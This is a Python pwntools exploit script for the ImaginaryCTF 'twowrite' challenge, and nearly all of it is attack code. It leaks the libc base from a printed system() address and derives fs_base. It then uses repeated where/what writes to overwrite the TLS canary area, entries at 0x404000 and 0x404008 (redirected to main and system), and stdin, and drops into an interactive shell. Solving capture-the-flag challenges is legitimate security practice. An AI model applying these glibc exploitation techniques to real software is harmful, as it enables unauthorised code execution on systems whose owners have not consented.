#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "twowrite.chal.imaginaryctf.org"
exe = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.41.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x00000000004012B3
            b* 0x401221
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def left_rotate(data, bit):
    return (data << bit) | (data >> (64 - bit))

# VARIABLE
main = exe.sym.main

# PAYLOAD
p.recvuntil(b'system @ ')
system = int(p.recvuntil(b'\n', drop=True), 16)
libc.address = system - libc.sym.system
log.info("Libc base: " + hex(libc.address))
fs_base = libc.address - 0x28c0
stdin = libc.sym._IO_2_1_stdin_
bin_sh = next(libc.search(b'/bin/sh'))

## exit
# left_rotate(target, 0x11)
# fs_base - 0x50 = ... -> main
# fs_base + 0x30 = 0
# ... = main

## stack_chk_fail
# fs_base + 0x28 = 0
# stack_chk_fail = main

p.sendlineafter(b'what? ', str(main))
p.sendlineafter(b'what? ', str(libc.sym.setbuf))
p.sendlineafter(b'where? ', hex(0x404000).encode()) # fs_base + 0x30
p.sendlineafter(b'where? ', hex(fs_base + 0x20).encode()) # fs_base + 0x20 fs_base + 0x38

p.sendlineafter(b'what? ', str(system))
p.sendlineafter(b'what? ', str(libc.sym.printf))
p.sendlineafter(b'where? ', hex(0x404008).encode())
p.sendlineafter(b'where? ', hex(fs_base + 0x20).encode()) # fs_base + 0x20

p.sendlineafter(b'what? ', str(29400045130965551))
p.sendlineafter(b'what? ', str(1234))
p.sendlineafter(b'where? ', hex(stdin).encode())
p.sendlineafter(b'where? ', hex(fs_base + 0x20).encode()) # fs_base + 0x20

p.interactive()

# 0x404100